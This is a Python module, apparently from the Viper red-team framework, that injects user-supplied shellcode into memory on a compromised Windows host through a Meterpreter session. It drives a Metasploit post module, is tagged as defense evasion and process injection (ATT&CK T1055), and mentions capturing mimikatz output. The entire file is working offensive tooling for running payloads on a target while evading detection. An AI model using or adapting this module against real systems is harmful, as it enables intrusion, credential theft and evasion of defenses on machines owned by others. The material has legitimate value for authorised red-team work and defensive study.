# -*- coding: utf-8 -*-
# @File  : SimplePostPythonModule.py
# @Date  : 2019/1/12
# @Desc  :

from Lib.ModuleAPI import *


class PostModule(PostMSFRawModule):
    NAME_ZH = "内存执行Shellcode"
    DESC_ZH = "在主机内存中注入shellcode并执行,文件后缀必须为bin.\n" \
              "post/windows/manage/shellcode_inject模块可实现交互式执行\n" \
              "shellcode执行与cpu架构强相关,arch选项要填写准确.\n" \
              "如不需要shellcode输出(如payload上线),无需勾选获取输出.\n" \
              "如需要获取shellcode执行之后的输出(mimikatz),请勾选获取输出选项,并填写等待时间\n"

    NAME_EN = "Memory execution shellcode"
    DESC_EN = "Inject the shellcode into the host memory and execute it, the file suffix must be bin.\n" \
              "The post/windows/manage/shellcode_inject module can realize interactive execution.\n" \
              "Shellcode execution is strongly related to the cpu architecture, and the arch option must be filled in accurately.\n" \
              "If you don't need shellcode output (such as the payload is online), you don't need to check to get the output.\n" \
              "If you need to get the output (mimikatz) after the shellcode is executed, please check the get output option and fill in the waiting time\n"

    MODULETYPE = TAG2TYPE.Defense_Evasion
    PLATFORM = ["Windows"]  # 平台
    PERMISSIONS = ["User", "Administrator", "SYSTEM", ]  # 所需权限
    ATTCK = ["T1055"]  # ATTCK向量
    README = ["https://www.yuque.com/vipersec/module/exuqn2"]
    REFERENCES = ["https://attack.mitre.org/techniques/T1050/"]
    AUTHOR = ["Viper"]

    REQUIRE_SESSION = True
    OPTIONS = register_options([
        OptionFileEnum(ext=['bin']),
        OptionEnum(name='ARCH',
                   tag_zh="ARCH", desc_zh="选择载荷的Arch平台(x86,x64)",
                   tag_en="Arch", desc_en="Choose the Arch platform of the payload (x86, x64)",
                   required=True,
                   default='x64',
                   enum_list=[
                       {'tag_zh': 'x86', 'tag_en': 'x86', 'value': 'x86'},
                       {'tag_zh': 'x64', 'tag_en': 'x64', 'value': 'x64'},
                   ]),
        OptionBool(name='CHANNELIZED',
                   tag_zh="获取输出", desc_zh="是否需要获取shellcode执行后输出结果",
                   tag_en="Get output", desc_en="Whether need to get the output result after shellcode execution",
                   required=True, default=True),
        OptionInt(name='WAIT_OUTPUT',
                  tag_zh="等待输出时间(秒)", desc_zh="shellcode执行后等待输出结果的时间(秒)(3-180)",
                  tag_en="Waiting for output time (seconds)",
                  desc_en="The time to wait for the output result after shellcode is executed (seconds) (3-180)",
                  required=True,
                  default=3),
        OptionBool(name='KILL',
                   tag_zh="关闭进程", desc_zh="执行shellcode完成后关闭新增的进程",
                   tag_en="Kill process", desc_en="Close the newly added process after executing the shellcode",
                   required=True, default=True),

    ])

    def __init__(self, sessionid, ipaddress, custom_param):
        super().__init__(sessionid, ipaddress, custom_param)
        self.type = "post"
        self.mname = "windows/manage/shellcode_inject_api"

    def check(self):
        """执行前的检查函数"""
        script = self.get_fileoption_filename()
        if script is None:
            return False, "请选择执行shellcode文件,文件后缀必须为bin", "Please choose to execute the shellcode file, the file suffix must be bin"
        else:
            self.set_msf_option(key='SHELLCODE_FILE', value=script)
        self.set_msf_option(key='CHANNELIZED', value=self.param('CHANNELIZED'))
        wait_ouput = self.param('WAIT_OUTPUT')
        if wait_ouput < 3:
            wait_ouput = 3
        elif wait_ouput > 180:
            wait_ouput = 180

        self.set_msf_option(key='WAIT_OUTPUT', value=wait_ouput)
        self.set_msf_option(key='KILL', value=self.param('KILL'))

        session = Session(self._sessionid)
        if session.is_alive:
            pass
        else:
            return False, "Session不可用", "Session is unavailable"
        if session.is_windows:
            pass
        else:
            return False, "此模块只支持Windows的Meterpreter", "This module only supports Meterpreter for Windows"

        if self.param('ARCH') in ["x86", "x64"]:
            self.set_msf_option(key='ARCH', value=self.param("ARCH"))
        else:
            return False, "Arch输入错误", "Arch input error"
        return True, None

    def callback(self, status, message, data):
        if status:
            self.log_info("模块执行完成", "Module operation completed")
            self.log_good(f"新进程PID :{data.get('pid')}", f"New process PID: {data.get('pid')}")
            self.log_good(f"新进程输出 :{data.get('output')}", f"New process output: {data.get('output')}")
        else:
            self.log_error("模块执行失败", "Module execution failed")
            self.log_error(message, message)
